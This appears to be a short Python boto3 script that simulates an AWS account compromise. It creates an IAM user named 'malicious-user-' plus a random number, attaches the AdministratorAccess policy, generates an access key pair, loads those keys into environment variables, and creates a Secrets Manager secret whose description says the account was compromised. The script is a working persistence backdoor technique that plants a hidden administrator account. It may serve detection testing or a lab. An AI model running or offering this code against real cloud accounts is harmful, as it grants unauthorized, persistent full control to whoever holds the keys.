import boto3, json, time, uuid, random, os
some_random_number = str(random.randrange(100000))

#creates new iam user
iam = boto3.resource('iam')
new_user = 'malicious-user-' + str(some_random_number)
user = iam.User(new_user)
user = user.create(Path='/')

# attaches AWS managed admin role
user.attach_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')

# creates access key and secret id for new user
access_key_pair = user.create_access_key_pair()
access_id = access_key_pair.id
secret_key = access_key_pair.secret

# set environment variables with new user access key and secret
os.environ["AWS_ACCESS_KEY_ID"] = access_key_pair.id
os.environ["AWS_SECRET_ACCESS_KEY"] = access_key_pair.secret
os.environ["AWS_SESSION_TOKEN"] = ""

# print(f'{access_id} {secret_key}')
# print(f'{os.environ["AWS_ACCESS_KEY_ID"]} {os.environ["AWS_SECRET_ACCESS_KEY"]}')

# time.sleep(5)

# session = boto3.session.Session(aws_access_key_id=access_id, 
# aws_secret_access_key=secret_key)

# print(f'session {session.get_credentials().access_key}')

# add access key to seccrets manager
secrets_manager = boto3.client('secretsmanager', region_name='us-east-2')
secret_name = 'some_super_secret-' + str(some_random_number)

response = secrets_manager.create_secret(
    Name=secret_name,
    Description='A secret we created because your account was ccompromised',
    SecretString='test'
)

print(response)